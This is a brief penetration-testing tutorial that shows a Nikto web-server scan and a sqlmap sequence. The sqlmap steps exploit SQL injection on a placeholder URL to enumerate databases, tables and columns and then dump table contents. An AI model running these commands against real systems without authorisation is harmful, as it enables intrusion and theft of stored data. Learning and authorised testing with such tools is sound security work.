# Scanning a webserver with Nikto


## Examples

### Nikto

    nikto -h [IP address] -p 80 -o nikto_scan -F txt

### SQLMap

Identify a page in the target web application that displays data and note the URL. Use in sqlmap:

    sqlmap -u http://urloftargetpage/page.php?id=2 --dbs

If SQL injections are successful, the `--dbs` parameter gives information about the database, such as the 
type of database and the database name.

Then try to retrieve the list of tables from the database:

    sqlmap -u http://urloftargetpage/page.php?id=2 -D databasename --tables

With a list of the table names, get information such as the columns that exist in a table:

    sqlmap -u http://urloftargetpage/page.php?id=2 -D databasename -T tablename --columns

Dump the data stored in a table:

    sqlmap -u http://urloftargetpage/page.php?id=2 -D databasename -T tablename --dump

## Tools

* [Nikto](https://www.kali.org/tools/nikto/)
* [SQLMap](https://www.kali.org/tools/sqlmap/)
